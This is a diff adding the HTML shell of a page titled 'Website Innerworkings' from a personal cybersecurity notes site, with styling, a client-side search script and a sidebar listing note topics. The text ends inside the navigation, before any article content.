@@ -1,0 +1,556 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="Personal cybersecurity notes, writeups, and reference vault"><title>Website Innerworkings — CyberHacks</title><link rel="stylesheet" href="/styles/global.css"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><style>.site-header{position:sticky;top:0;z-index:100;height:56px;background:#09070fed;backdrop-filter:blur(16px);border-bottom:1px solid var(--border)}.header-inner{display:flex;align-items:center;gap:2rem;height:100%;padding:0 1.5rem}.logo{display:flex;align-items:center;gap:.5rem;color:var(--text);font-family:var(--font-display);font-weight:800;font-size:1.1rem;text-decoration:none;flex-shrink:0;letter-spacing:-.02em}.logo-icon{color:var(--purple-3)}.logo:hover{color:var(--purple-1)}.header-nav{display:flex;align-items:center;gap:.2rem}.nav-link{color:var(--text-muted);font-size:.78rem;font-weight:500;letter-spacing:.06em;text-transform:uppercase;padding:.35rem .7rem;border-radius:6px;text-decoration:none;transition:color .15s,background .15s;position:relative}.nav-link:hover{color:var(--purple-1);background:var(--surface)}.nav-link.active{color:var(--purple-2);background:var(--surface)}.nav-link.active:after{content:"";position:absolute;bottom:-1px;left:.7rem;right:.7rem;height:2px;background:var(--purple-3);border-radius:2px 2px 0 0}.hdr-search{position:relative;flex-shrink:0}.hdr-search-box{display:flex;align-items:center;gap:.4rem;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:.28rem .6rem;width:210px;transition:border-color .15s;cursor:text}.hdr-search-box:focus-within{border-color:var(--purple-3)}#hdr-input{background:transparent;border:none;outline:none;color:var(--text);font-size:.8rem;font-family:var(--font-sans);width:100%}#hdr-input::placeholder{color:var(--text-dim)}.hdr-search-box kbd{font-size:.58rem;background:var(--surface-2);border:1px solid var(--border-2);border-radius:4px;padding:.1rem .3rem;color:var(--text-dim);flex-shrink:0}.hdr-dropdown{position:absolute;top:calc(100% + 6px);right:0;width:380px;background:#0b0814fa;border:1px solid var(--border-2);border-radius:10px;box-shadow:0 20px 60px #000000b3;padding:.35rem;z-index:999}#hdr-results{display:flex;flex-direction:column;gap:.25rem;max-height:420px;overflow-y:auto;overflow-x:hidden;scrollbar-width:thin;scrollbar-color:var(--border-2) transparent}#hdr-results::-webkit-scrollbar{width:3px}#hdr-results::-webkit-scrollbar-track{background:transparent}#hdr-results::-webkit-scrollbar-thumb{background:var(--border-2);border-radius:3px}#hdr-results::-webkit-scrollbar-thumb:hover{background:var(--purple-3)}.hdr-result{display:block;padding:.6rem .75rem;background:#140f22cc;border:1px solid rgba(42,32,64,.9);border-radius:8px;text-decoration:none;transition:background .15s,border-color .15s,transform .15s;cursor:pointer;overflow:hidden}.hdr-result:hover{background:#5a3db833;border-color:var(--purple-3);transform:translate(2px);pointer-events:auto}.hdr-result-title{font-size:.82rem;font-weight:600;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;line-height:1.3;margin-bottom:.2rem}.hdr-result:hover .hdr-result-title{color:var(--purple-1)}.hdr-result-path{font-size:.62rem;color:var(--text-dim);text-transform:capitalize;letter-spacing:.02em}.hdr-result-path span{color:var(--purple-3);font-weight:700;letter-spacing:.08em;text-transform:uppercase;font-size:.58rem}.hdr-empty{padding:1rem;text-align:center;color:var(--text-dim);font-size:.76rem}.hdr-view-all{display:block;margin-top:.3rem;padding:.45rem .75rem;background:#140f2280;border:1px solid var(--border);border-radius:7px;font-size:.7rem;color:var(--text-muted);text-align:center;text-decoration:none;transition:color .15s,border-color .15s;flex-shrink:0}.hdr-view-all:hover{color:var(--purple-2);border-color:var(--purple-3);background:#140f2280;transform:none}.hdr-result-excerpt{font-size:.62rem;color:var(--text-muted);line-height:1.35;margin-top:.25rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:100%}.hdr-result-excerpt mark{background:#7c5ce84d;color:var(--purple-1);border-radius:2px;padding:0 2px;font-style:normal}@media(max-width:768px){.header-nav,.hdr-search-box kbd{display:none}.hdr-dropdown{width:calc(100vw - 2rem);right:-.5rem}}
+</style><link rel="stylesheet" href="/_astro/_..CUfV36Wy.css"></head> <body> <div class="bg-gradient"></div> <div class="bg-noise"></div> <div class="bg-grid"></div> <div class="site-wrap">  <header class="site-header"> <div class="header-inner"> <a href="/" class="logo"> <span class="logo-icon">⬡</span> <span class="logo-text">CyberHacks</span> </a> <nav class="header-nav"> <a href="/knowledge" class="nav-link active"> Knowledge </a><a href="/techniques" class="nav-link "> Techniques </a><a href="/playbooks" class="nav-link "> Playbooks </a><a href="/tools" class="nav-link "> Tools </a><a href="/resources" class="nav-link "> Resources </a><a href="/labs" class="nav-link "> Labs </a> </nav> <div class="hdr-search" id="hdr-search"> <div class="hdr-search-box"> <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="color:var(--text-dim);flex-shrink:0"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.35-4.35"></path></svg> <input id="hdr-input" type="text" placeholder="Search notes..." autocomplete="off" spellcheck="false"> <kbd>⌘K</kbd> </div> <div class="hdr-dropdown" id="hdr-dropdown" style="display:none"> <div id="hdr-results"></div> <a id="hdr-all" href="/search" class="hdr-view-all">View all results →</a> </div> </div> </div> </header>  <script>
+(function(){
+  let pf = null;
+  let timer = null;
+  const input = document.getElementById('hdr-input');
+  const dropdown = document.getElementById('hdr-dropdown');
+  const results = document.getElementById('hdr-results');
+  const viewAll = document.getElementById('hdr-all');
+  if(!input) return;
+
+  async function init() {
+    if(pf) return pf;
+    try {
+      pf = await import('/pagefind/pagefind.js');
+      await pf.init();
+    } catch(e){ pf=null; }
+    return pf;
+  }
+
+  input.addEventListener('focus', init);
+
+  input.addEventListener('input', ()=>{
+    clearTimeout(timer);
+    timer = setTimeout(async ()=>{
+      const q = input.value.trim();
+      if(!q){ dropdown.style.display='none'; return; }
+
+      const lib = await init();
+      if(!lib){
+        results.innerHTML = '<div class="hdr-empty">Run a build to enable search.</div>';
+        dropdown.style.display='block';
+        return;
+      }
+
+      const res = await lib.search(q);
+      const top = await Promise.all(res.results.slice(0,5).map(r=>r.data()));
+      viewAll.href = '/search?q='+encodeURIComponent(q);
+
+      if(!top.length){
+        results.innerHTML = '<div class="hdr-empty">No results for "'+q+'"</div>';
+      } else {
+        results.innerHTML = top.map(r=>{
+          const parts = r.url.split('/').filter(Boolean);
+          const cat = parts[0]||'';
+          const sub = parts.length>2 ? parts[1].replace(/-/g,' ') : '';
+          const title = (r.meta&&r.meta.title||'')
+            .replace(/\s*[—–-]+\s*CyberHacks\s*$/i,'').trim()
+            || parts[parts.length-1].replace(/-/g,' ');
+          const path = sub ? `<span>${cat}</span> / ${sub}` : `<span>${cat}</span>`;
+          const excerpt = (r.excerpt||'')
+            .replace(/<(?!\/?mark)[^>]+>/g,'')
+            .replace(/\s+/g,' ')
+            .replace(/^[\s\/\-–—]+/,'')
+            .trim()
+            .slice(0,90);
+          return '<a href="'+r.url+'" class="hdr-result">'
+            +'<div class="hdr-result-title">'+title+'</div>'
+            +'<div class="hdr-result-path">'+path+'</div>'
+            +(excerpt?'<div class="hdr-result-excerpt">'+excerpt+'</div>':'')
+            +'</a>';
+        }).join('');
+      }
+      dropdown.style.display='block';
+    }, 180);
+  });
+
+  document.addEventListener('click', e=>{
+    if(!document.getElementById('hdr-search').contains(e.target))
+      dropdown.style.display='none';
+  });
+
+  document.addEventListener('keydown', e=>{
+    if((e.metaKey||e.ctrlKey)&&e.key==='k'){
+      e.preventDefault(); input.focus(); input.select();
+    }
+    if(e.key==='Escape'){ dropdown.style.display='none'; input.blur(); }
+    if(e.key==='Enter'&&dropdown.style.display!=='none'&&input.value.trim())
+      window.location.href='/search?q='+encodeURIComponent(input.value.trim());
+  });
+})();
+</script> <div class="note-shell" data-astro-cid-o5gmpz7g> <aside class="sidebar" id="sidebar" data-astro-cid-o5gmpz7g> <div class="sidebar-inner" data-astro-cid-o5gmpz7g> <nav class="sidebar-nav" data-astro-cid-o5gmpz7g> <nav class="sidebar-tree" data-astro-cid-gvqsdny3> <div class="cat-group" data-open="true" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge" class="cat-label-link active" data-astro-cid-gvqsdny3> Knowledge </a> <span class="cat-count" data-astro-cid-gvqsdny3>91</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Artificial%20Intelligence" class="subcat-label-link " data-astro-cid-gvqsdny3> Artificial Intelligence </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/artificial-intelligence/ai-ml-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> AI ML Fundamentals </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Core%20Security%20Concepts" class="subcat-label-link " data-astro-cid-gvqsdny3> Core Security Concepts </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/core-security-concepts/cyber-kill-chain" class="nav-note " data-astro-cid-gvqsdny3> Cyber Kill Chain </a><a href="/knowledge/core-security-concepts/ddos" class="nav-note " data-astro-cid-gvqsdny3> DDoS </a><a href="/knowledge/core-security-concepts/insider-threat" class="nav-note " data-astro-cid-gvqsdny3> Insider Threat </a><a href="/knowledge/core-security-concepts/mitre-attck-framework" class="nav-note " data-astro-cid-gvqsdny3> MITRE ATTCK Framework </a><a href="/knowledge/core-security-concepts/osint" class="nav-note " data-astro-cid-gvqsdny3> OSINT </a><a href="/knowledge/core-security-concepts/ransomware" class="nav-note " data-astro-cid-gvqsdny3> Ransomware </a><a href="/knowledge/core-security-concepts/security-domains" class="nav-note " data-astro-cid-gvqsdny3> Security Domains </a><a href="/knowledge/core-security-concepts/security-principles" class="nav-note " data-astro-cid-gvqsdny3> Security Principles </a><a href="/knowledge/core-security-concepts/social-engineering" class="nav-note " data-astro-cid-gvqsdny3> Social Engineering </a><a href="/knowledge/core-security-concepts/threat-actors" class="nav-note " data-astro-cid-gvqsdny3> Threat Actors </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Cryptography" class="subcat-label-link " data-astro-cid-gvqsdny3> Cryptography </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/cryptography/cryptography-basics" class="nav-note " data-astro-cid-gvqsdny3> Cryptography Basics </a><a href="/knowledge/cryptography/hashing-basics" class="nav-note " data-astro-cid-gvqsdny3> Hashing Basics </a><a href="/knowledge/cryptography/public-key-basics" class="nav-note " data-astro-cid-gvqsdny3> Public Key Basics </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Defensive%20Security" class="subcat-label-link " data-astro-cid-gvqsdny3> Defensive Security </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/defensive-security/defensive-security-intro" class="nav-note " data-astro-cid-gvqsdny3> Defensive Security Intro </a><a href="/knowledge/defensive-security/digital-forensics-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Digital Forensics Fundamentals </a><a href="/knowledge/defensive-security/incident-response-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Incident Response Fundamentals </a><a href="/knowledge/defensive-security/log-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Log Fundamentals </a><a href="/knowledge/defensive-security/network-traffic-analysis" class="nav-note " data-astro-cid-gvqsdny3> Network Traffic Analysis </a><a href="/knowledge/defensive-security/soc-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> SOC Fundamentals </a><a href="/knowledge/defensive-security/threat-hunting" class="nav-note " data-astro-cid-gvqsdny3> Threat Hunting </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Security%20Solutions" class="subcat-label-link " data-astro-cid-gvqsdny3> Security Solutions </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/defensive-security/security-solutions/intro-to-siem" class="nav-note " data-astro-cid-gvqsdny3> Intro To SIEM </a><a href="/knowledge/defensive-security/security-solutions/intrusion-detection-systems-ids" class="nav-note " data-astro-cid-gvqsdny3> Intrusion Detection Systems IDS </a><a href="/knowledge/defensive-security/security-solutions/siem-use-case-development" class="nav-note " data-astro-cid-gvqsdny3> SIEM Use Case Development </a><a href="/knowledge/defensive-security/security-solutions/vulnerability-scanners" class="nav-note " data-astro-cid-gvqsdny3> Vulnerability Scanners </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Foundational%20Cs" class="subcat-label-link " data-astro-cid-gvqsdny3> Foundational Cs </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/foundational-cs/arm-processor-architecture" class="nav-note " data-astro-cid-gvqsdny3> ARM Processor Architecture </a><a href="/knowledge/foundational-cs/cpu-architecture" class="nav-note " data-astro-cid-gvqsdny3> CPU Architecture </a><a href="/knowledge/foundational-cs/data-representation" class="nav-note " data-astro-cid-gvqsdny3> Data Representation </a><a href="/knowledge/foundational-cs/input-and-output" class="nav-note " data-astro-cid-gvqsdny3> Input And Output </a><a href="/knowledge/foundational-cs/memory-architecture" class="nav-note " data-astro-cid-gvqsdny3> Memory Architecture </a><a href="/knowledge/foundational-cs/multi-processing" class="nav-note " data-astro-cid-gvqsdny3> Multi Processing </a><a href="/knowledge/foundational-cs/x86-architecture" class="nav-note " data-astro-cid-gvqsdny3> X86 Architecture </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Networking" class="subcat-label-link " data-astro-cid-gvqsdny3> Networking </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/networking/data-transmission-methods" class="nav-note " data-astro-cid-gvqsdny3> Data Transmission Methods </a><a href="/knowledge/networking/dns-domain-name-system" class="nav-note " data-astro-cid-gvqsdny3> DNS Domain Name System </a><a href="/knowledge/networking/firewalls" class="nav-note " data-astro-cid-gvqsdny3> Firewalls </a><a href="/knowledge/networking/ftp" class="nav-note " data-astro-cid-gvqsdny3> FTP </a><a href="/knowledge/networking/http-https" class="nav-note " data-astro-cid-gvqsdny3> HTTP HTTPS </a><a href="/knowledge/networking/imap-pop3" class="nav-note " data-astro-cid-gvqsdny3> IMAP POP3 </a><a href="/knowledge/networking/ip-addressing" class="nav-note " data-astro-cid-gvqsdny3> IP Addressing </a><a href="/knowledge/networking/ipmi" class="nav-note " data-astro-cid-gvqsdny3> IPMI </a><a href="/knowledge/networking/lan-topologies" class="nav-note " data-astro-cid-gvqsdny3> LAN Topologies </a><a href="/knowledge/networking/mssql" class="nav-note " data-astro-cid-gvqsdny3> MSSQL </a><a href="/knowledge/networking/mysql" class="nav-note " data-astro-cid-gvqsdny3> MySQL </a><a href="/knowledge/networking/network-media-connections" class="nav-note " data-astro-cid-gvqsdny3> Network Media Connections </a><a href="/knowledge/networking/networking-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Networking Fundamentals </a><a href="/knowledge/networking/nfs" class="nav-note " data-astro-cid-gvqsdny3> NFS </a><a href="/knowledge/networking/oracle-tns" class="nav-note " data-astro-cid-gvqsdny3> Oracle TNS </a><a href="/knowledge/networking/osi-model" class="nav-note " data-astro-cid-gvqsdny3> OSI Model </a><a href="/knowledge/networking/packets-and-frames" class="nav-note " data-astro-cid-gvqsdny3> Packets And Frames </a><a href="/knowledge/networking/ports" class="nav-note " data-astro-cid-gvqsdny3> Ports </a><a href="/knowledge/networking/protocols" class="nav-note " data-astro-cid-gvqsdny3> Protocols </a><a href="/knowledge/networking/smb" class="nav-note " data-astro-cid-gvqsdny3> SMB </a><a href="/knowledge/networking/smtp" class="nav-note " data-astro-cid-gvqsdny3> SMTP </a><a href="/knowledge/networking/snmp" class="nav-note " data-astro-cid-gvqsdny3> SNMP </a><a href="/knowledge/networking/subnetting" class="nav-note " data-astro-cid-gvqsdny3> Subnetting </a><a href="/knowledge/networking/tls-ssl" class="nav-note " data-astro-cid-gvqsdny3> TLS SSL </a><a href="/knowledge/networking/vpn-basics" class="nav-note " data-astro-cid-gvqsdny3> VPN Basics </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Offensive%20Security" class="subcat-label-link " data-astro-cid-gvqsdny3> Offensive Security </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/offensive-security/footprinting-enumeration" class="nav-note " data-astro-cid-gvqsdny3> Footprinting Enumeration </a><a href="/knowledge/offensive-security/offensive-security-intro" class="nav-note " data-astro-cid-gvqsdny3> Offensive Security Intro </a><a href="/knowledge/offensive-security/pentesting-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Pentesting Fundamentals </a><a href="/knowledge/offensive-security/web-reconnaissance" class="nav-note " data-astro-cid-gvqsdny3> Web Reconnaissance </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Operating%20Systems" class="subcat-label-link " data-astro-cid-gvqsdny3> Operating Systems </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/operating-systems/boot-and-file-systems" class="nav-note " data-astro-cid-gvqsdny3> Boot And File Systems </a><a href="/knowledge/operating-systems/containerization" class="nav-note " data-astro-cid-gvqsdny3> Containerization </a><a href="/knowledge/operating-systems/operating-system-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Operating System Fundamentals </a><a href="/knowledge/operating-systems/operating-system-internals" class="nav-note " data-astro-cid-gvqsdny3> Operating System Internals </a><a href="/knowledge/operating-systems/solaris" class="nav-note " data-astro-cid-gvqsdny3> Solaris </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Linux" class="subcat-label-link " data-astro-cid-gvqsdny3> Linux </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/operating-systems/linux/linux-file-system" class="nav-note " data-astro-cid-gvqsdny3> Linux File System </a><a href="/knowledge/operating-systems/linux/linux-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Linux Fundamentals </a><a href="/knowledge/operating-systems/linux/linux-hardening" class="nav-note " data-astro-cid-gvqsdny3> Linux Hardening </a><a href="/knowledge/operating-systems/linux/linux-networking" class="nav-note " data-astro-cid-gvqsdny3> Linux Networking </a><a href="/knowledge/operating-systems/linux/linux-shells" class="nav-note " data-astro-cid-gvqsdny3> Linux Shells </a><a href="/knowledge/operating-systems/linux/linux-system-management" class="nav-note " data-astro-cid-gvqsdny3> Linux System Management </a><a href="/knowledge/operating-systems/linux/shell-scripting" class="nav-note " data-astro-cid-gvqsdny3> Shell Scripting </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Windows" class="subcat-label-link " data-astro-cid-gvqsdny3> Windows </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/operating-systems/windows/event-tracing-for-windows-etw" class="nav-note " data-astro-cid-gvqsdny3> Event Tracing For Windows ETW </a><a href="/knowledge/operating-systems/windows/windows-command-line" class="nav-note " data-astro-cid-gvqsdny3> Windows Command Line </a><a href="/knowledge/operating-systems/windows/windows-event-logs" class="nav-note " data-astro-cid-gvqsdny3> Windows Event Logs </a><a href="/knowledge/operating-systems/windows/windows-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Windows Fundamentals </a><a href="/knowledge/operating-systems/windows/windows-powershell" class="nav-note " data-astro-cid-gvqsdny3> Windows PowerShell </a><a href="/knowledge/operating-systems/windows/windows-remote-management" class="nav-note " data-astro-cid-gvqsdny3> Windows Remote Management </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Active%20Directory" class="subcat-label-link " data-astro-cid-gvqsdny3> Active Directory </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/operating-systems/windows/active-directory/active-directory-basics" class="nav-note " data-astro-cid-gvqsdny3> Active Directory Basics </a> </div> </div><div class="subcat-group" data-open="true" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Web%20Security" class="subcat-label-link active" data-astro-cid-gvqsdny3> Web Security </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/web-security/certificate-transparency-logs" class="nav-note " data-astro-cid-gvqsdny3> Certificate Transparency Logs </a><a href="/knowledge/web-security/javascript-essentials" class="nav-note " data-astro-cid-gvqsdny3> JavaScript Essentials </a><a href="/knowledge/web-security/owasp-top-10---2021" class="nav-note " data-astro-cid-gvqsdny3> OWASP Top 10   2021 </a><a href="/knowledge/web-security/sql-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> SQL Fundamentals </a><a href="/knowledge/web-security/virtual-hosts" class="nav-note " data-astro-cid-gvqsdny3> Virtual Hosts </a><a href="/knowledge/web-security/web-apis" class="nav-note " data-astro-cid-gvqsdny3> Web APIs </a><a href="/knowledge/web-security/web-application-proxies" class="nav-note " data-astro-cid-gvqsdny3> Web Application Proxies </a><a href="/knowledge/web-security/web-crawling" class="nav-note " data-astro-cid-gvqsdny3> Web Crawling </a><a href="/knowledge/web-security/web-fingerprinting" class="nav-note " data-astro-cid-gvqsdny3> Web Fingerprinting </a><a href="/knowledge/web-security/website-innerworkings" class="nav-note active" data-astro-cid-gvqsdny3> Website Innerworkings </a><a href="/knowledge/web-security/wordpress" class="nav-note " data-astro-cid-gvqsdny3> WordPress </a> </div> </div> </div> </div><div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/techniques" class="cat-label-link " data-astro-cid-gvqsdny3> Techniques </a> <span class="cat-count" data-astro-cid-gvqsdny3>10</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <a href="/techniques/api-fuzzing" class="nav-note " data-astro-cid-gvqsdny3> API Fuzzing </a><a href="/techniques/command-injection" class="nav-note " data-astro-cid-gvqsdny3> Command Injection </a><a href="/techniques/dns-enumeration" class="nav-note " data-astro-cid-gvqsdny3> DNS Enumeration </a><a href="/techniques/javascript-deobfuscation" class="nav-note " data-astro-cid-gvqsdny3> JavaScript Deobfuscation </a><a href="/techniques/sql-injection" class="nav-note " data-astro-cid-gvqsdny3> SQL Injection </a><a href="/techniques/subdomain-enumeration" class="nav-note " data-astro-cid-gvqsdny3> Subdomain Enumeration </a><a href="/techniques/vhost-fuzzing" class="nav-note " data-astro-cid-gvqsdny3> VHost Fuzzing </a><a href="/techniques/wordpress-attacks" class="nav-note " data-astro-cid-gvqsdny3> WordPress Attacks </a><a href="/techniques/xss" class="nav-note " data-astro-cid-gvqsdny3> XSS </a><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/techniques?filter=Cryptography%20Attacks" class="subcat-label-link " data-astro-cid-gvqsdny3> Cryptography Attacks </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/techniques/cryptography-attacks/rsa-cracking" class="nav-note " data-astro-cid-gvqsdny3> RSA Cracking </a> </div> </div> </div> </div><div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/playbooks" class="cat-label-link " data-astro-cid-gvqsdny3> Playbooks </a> <span class="cat-count" data-astro-cid-gvqsdny3>6</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <a href="/playbooks/linux-forensics-playbook" class="nav-note " data-astro-cid-gvqsdny3> Linux Forensics Playbook </a><a href="/playbooks/linux-pentest-playbook" class="nav-note " data-astro-cid-gvqsdny3> Linux Pentest Playbook </a><a href="/playbooks/osint-playbook" class="nav-note " data-astro-cid-gvqsdny3> OSINT Playbook </a><a href="/playbooks/windows-pentest-playbook" class="nav-note " data-astro-cid-gvqsdny3> Windows Pentest Playbook </a><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/playbooks?filter=Methodologies" class="subcat-label-link " data-astro-cid-gvqsdny3> Methodologies </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/playbooks/methodologies/blue-team" class="nav-note " data-astro-cid-gvqsdny3> Blue Team </a><a href="/playbooks/methodologies/red-team" class="nav-note " data-astro-cid-gvqsdny3> Red Team </a> </div> </div> </div> </div><div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools" class="cat-label-link " data-astro-cid-gvqsdny3> Tools </a> <span class="cat-count" data-astro-cid-gvqsdny3>63</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Cryptography" class="subcat-label-link " data-astro-cid-gvqsdny3> Cryptography </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/cryptography/cyberchef" class="nav-note " data-astro-cid-gvqsdny3> CyberChef </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Defense%20Monitoring" class="subcat-label-link " data-astro-cid-gvqsdny3> Defense Monitoring </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/defense-monitoring/elastic-stack" class="nav-note " data-astro-cid-gvqsdny3> Elastic Stack </a><a href="/tools/defense-monitoring/iptables" class="nav-note " data-astro-cid-gvqsdny3> Iptables </a><a href="/tools/defense-monitoring/silketw" class="nav-note " data-astro-cid-gvqsdny3> SilkETW </a><a href="/tools/defense-monitoring/snort" class="nav-note " data-astro-cid-gvqsdny3> Snort </a><a 